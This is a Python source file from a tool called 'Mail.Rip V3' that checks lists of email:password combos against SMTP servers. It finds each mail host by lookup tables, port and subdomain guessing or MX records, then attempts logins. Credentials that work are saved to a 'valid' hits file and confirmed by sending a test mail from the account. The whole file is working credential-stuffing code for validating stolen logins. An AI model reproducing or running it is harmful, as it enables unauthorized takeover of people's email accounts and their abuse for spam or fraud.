#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-

__author__ = 'DrPython3'
__date__ = '2021-11-14'
__version__ = '1'
__contact__ = 'https://github.com/DrPython3'

'''
---------------------------------------------
Functions for Checking Mailpass Combos (SMTP)
---------------------------------------------

Part of << Mail.Rip V3 >>
'''

# TODO: check for any errors and finalize ...

# [IMPORTS]
# ---------

import sys
import json
import ssl
import smtplib
from inc_testmail import mailer
from inc_etc import result
from inc_mxlookup import get_host

# [FUNCTIONS]
# -----------

def checker(default_timeout, default_email, target):
    '''
    Main checker function (SMTP) including testmail sending in case a valid login is found.

    :param float default_timeout: connection timeout set by user
    :param str default_email: user email for sending testmail
    :param str target: emailpass combo to check
    :return: True (valid login found), False (no valid login found)
    '''
    # set variables, load lists and dictionaries:
    sslcontext = ssl.create_default_context()
    output_hits = 'smtp_valid'
    output_checked = 'smtp_checked'
    output_testmail = 'smtp_testmails'
    try:
        with open('inc_smtpdomains.json') as inc_smtpdomains:
            load_domains = json.load(inc_smtpdomains)
            smtp_domains = (load_domains['smtpdomains'])
        with open('inc_smtpports.json') as inc_smtpports:
            load_ports = json.load(inc_smtpports)
            smtp_ports = (load_ports['smtpports'])
        with open('inc_smtpservices.json') as inc_smtpservices:
            load_services = json.load(inc_smtpservices)
            smtp_services = (load_services['smtpservices'])
    except:
        smtp_domains = []
        smtp_ports = []
        smtp_services = {}
    target_email = str('')
    target_user = str('')
    target_password = str('')
    target_host = str('')
    target_port = int(0)
    service_info = str('')
    host_found = False
    port_found = False
    connection_ok = False
    checker_result = False
    email_sent = False
    # start the checking procedure:
    try:
        # split combo:
        target_email, target_password = target.split(':')
        target_user = str(target_email)
        # get host and port from dictionary:
        try:
            service_info = str(smtp_services[target_email.split('@')[1]])
            target_host, target_port = service_info.split(':')
        # if previous step fails, search for host and port using common values:
        except:
            for subdomain in smtp_domains:
                test_host = str(subdomain + str(target_email.split('@')[1]))
                for test_port in smtp_ports:
                    try:
                        if test_port == 465:
                            smtp_connection = smtplib.SMTP_SSL(
                                host=test_host,
                                port=test_port,
                                timeout=default_timeout,
                                context=sslcontext
                            )
                            smtp_connection.ehlo()
                        else:
                            smtp_connection = smtplib.SMTP(
                                host=test_host,
                                port=test_port,
                                timeout=default_timeout
                            )
                            smtp_connection.ehlo()
                            try:
                                smtp_connection.starttls()
                                smtp_connection.ehlo()
                            except:
                                pass
                        # change variables for established connections:
                        target_host = test_host
                        target_port = test_port
                        host_found = True
                        port_found = True
                        connection_ok = True
                        break
                    except:
                        continue
                if host_found == True:
                    break
            # with no host found yet, try to get from MX records:
            if host_found == False:
                mx_result, found_host = get_host(default_timeout, target_email)
                if mx_result == True:
                    host_found = True
                    target_host = found_host
                    # get port for host found in MX records:
                    while port_found == False:
                        for test_port in smtp_ports:
                            try:
                                if test_port == 465:
                                    smtp_connection = smtplib.SMTP_SSL(
                                        host=target_host,
                                        port=test_port,
                                        timeout=default_timeout,
                                        context=sslcontext
                                    )
                                    smtp_connection.ehlo()
                                else:
                                    smtp_connection = smtplib.SMTP(
                                        host=target_host,
                                        port=test_port,
                                        timeout=default_timeout
                                    )
                                    smtp_connection.ehlo()
                                    try:
                                        smtp_connection.starttls()
                                        smtp_connection.ehlo()
                                    except:
                                        pass
                                # change variables for established connections:
                                target_port = test_port
                                port_found = True
                                connection_ok = True
                                break
                            except:
                                continue
        # with connection established:
        if connection_ok == True:
            try:
                # check login credentials:
                try:
                    smtp_connection.login(
                        user=target_user,
                        password=target_password
                    )
                except:
                    # on errors try login with user ID from email:
                    target_user = str(target_email.split('@')[0]).lower()
                    smtp_connection.login(
                        user=target_user,
                        password=target_password
                    )
                try:
                    smtp_connection.quit()
                except:
                    pass
                # change variable for working logins:
                checker_result = True
            except:
                pass
        # no connection established, write log for target:
        else:
            result(
                output_checked,
                str(target + ';result=no host or port found')
            )
        # with valid login, try to send testmail:
        if checker_result == True:
            try:
                email_sent = mailer(
                    default_email,
                    target_email,
                    target_host,
                    target_port,
                    target_user,
                    target_password
                )
                # write log for testmail:
                if email_sent == True:
                    result(
                        output_testmail,
                        str(target + ';result=testmail sent')
                    )
                else:
                    result(
                        output_testmail,
                        str(target + ':result=testmail not sent')
                    )
            # if testmail fails, write log:
            except:
                result(
                    output_testmail,
                    str(target + ';result=sending testmail failed')
                )
    # on any errors while checking, write log before exit:
    except:
        result(
            output_checked,
            str(target + ';result=checker failed')
        )
    # write logs for valid logins before exit:
    if checker_result == True:
        result(
            output_hits,
            str(f'email={target_email}, host={target_host}:{target_port}, login={target_user}:{target_password}')
        )
        result(
            output_checked,
            str(target + ';result=login valid')
        )
        return True
    # write log for non-valid logins before exit:
    else:
        result(
            output_checked,
            str(target + ';result=login failed')
        )
        return False

# DrPython3 (C) 2021 @ GitHub.com
